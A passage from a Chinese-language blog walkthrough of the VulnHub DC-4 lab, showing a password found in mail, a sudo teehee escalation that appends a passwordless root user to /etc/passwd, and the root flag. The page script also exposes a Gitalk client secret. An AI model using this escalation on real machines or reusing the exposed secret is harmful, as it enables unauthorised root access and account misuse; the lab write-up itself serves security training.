21:15:45 +1000<br>To: jim@dc-4<br>Subject: Holidays<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=<span class="hljs-string">&quot;UTF-8&quot;</span><br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;<br>From: Charles &lt;charles@dc-4&gt;<br>Date: Sat, 06 Apr 2019 21:15:45 +1000<br>Status: O<br><br>Hi Jim,<br><br>I<span class="hljs-string">&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Password is:  ^xHhA&amp;hvim0y</span><br><span class="hljs-string"></span><br><span class="hljs-string">See ya,</span><br><span class="hljs-string">Charles</span><br></code></pre></td></tr></table></figure>

<p>发现了charles的密码<code>^xHhA&amp;hvim0y</code></p>
<h3 id="charles"><a href="#charles" class="headerlink" title="charles"></a>charles</h3><p>直接切到charles</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">jim@dc-4:~$ su charles<br>Password: <br>charles@dc-4:/home/jim$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> charles on dc-4:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User charles may run the following commands on dc-4:<br>    (root) NOPASSWD: /usr/bin/teehee<br></code></pre></td></tr></table></figure>

<p>发现其可以无密码执行<code>teehee</code>，teehee是一个linux下的文本编辑器，我们可以在网上查到利用其提权的方法。即利用其向<code>/etc/passwd</code>写入一个gid和uid都为0的无密码用户。在linux里，如果一个用户在passwd和shadow里都没有密码，那我们就可以无密码登录这个用户。这样，我们只要su到这个用户就能获得root权限。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">charles@dc-4:/home/jim$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;test::0:0:::/bin/bash&quot;</span> | sudo teehee -a /etc/passwd<br><span class="hljs-built_in">test</span>::0:0:::/bin/bash<br>charles@dc-4:/home/jim$ su <span class="hljs-built_in">test</span><br>root@dc-4:/home/jim<span class="hljs-comment"># whoami</span><br>root<br>root@dc-4:/home/jim<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure>

<p>成功提权，检查一下passwd发现确实是如此实现的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">root@dc-4:/home/jim# cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false<br>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false<br>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false<br>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false<br>_apt:x:104:65534::/nonexistent:/bin/false<br>messagebus:x:105:109::/var/run/dbus:/bin/false<br>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br>nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false<br>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash<br>Debian-exim:x:108:112::/var/spool/exim4:/bin/false<br>test::0:0:::/bin/bash<br></code></pre></td></tr></table></figure>

<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@dc-4:/home/jim<span class="hljs-comment"># cd /root</span><br>root@dc-4:/root<span class="hljs-comment"># ls -la</span><br>total 28<br>drwx------  3 root root 4096 Apr  7  2019 .<br>drwxr-xr-x 21 root root 4096 Apr  5  2019 ..<br>-rw-------  1 root root   16 Apr  7  2019 .bash_history<br>-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc<br>-rw-r--r--  1 root root  976 Apr  6  2019 flag.txt<br>drwxr-xr-x  2 root root 4096 Apr  6  2019 .nano<br>-rw-r--r--  1 root root  148 Aug 18  2015 .profile<br>root@dc-4:/root<span class="hljs-comment"># cat flag.txt</span><br><br><br><br>888       888          888 888      8888888b.                             888 888 888 888 <br>888   o   888          888 888      888  <span class="hljs-string">&quot;Y88b                            888 888 888 888 </span><br><span class="hljs-string">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="hljs-string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="hljs-string">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;</span><span class="hljs-string">&quot;88b 888 &quot;</span>88b d8P  Y8b 888 888 888 888 <br>88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P <br>8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      <span class="hljs-string">&quot;   &quot;</span>   <span class="hljs-string">&quot;   &quot;</span>  <br>888P     Y888  <span class="hljs-string">&quot;Y8888  888 888      8888888P&quot;</span>   <span class="hljs-string">&quot;Y88P&quot;</span>  888  888  <span class="hljs-string">&quot;Y8888  888 888 888 888 </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Congratulations!!!</span><br><span class="hljs-string"></span><br><span class="hljs-string">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="hljs-string">who have provided feedback, and who have taken time to complete these little</span><br><span class="hljs-string">challenges.</span><br><span class="hljs-string"></span><br><span class="hljs-string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></code></pre></td></tr></table></figure>

<p>拿到flag。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/02/DC-5/">← Next [vulnhub]  DC:5</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/31/DC-3/">[vulnhub]  DC:3 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%AB%99"><span class="toc-number">3.1.</span> <span class="toc-text">查看网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">3.2.</span> <span class="toc-text">爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">3.3.</span> <span class="toc-text">RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#www-data"><span class="toc-number">4.1.</span> <span class="toc-text">www-data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jim"><span class="toc-number">4.2.</span> <span class="toc-text">jim</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#charles"><span class="toc-number">4.3.</span> <span class="toc-text">charles</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#root"><span class="toc-number">4.4.</span> <span class="toc-text">root</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>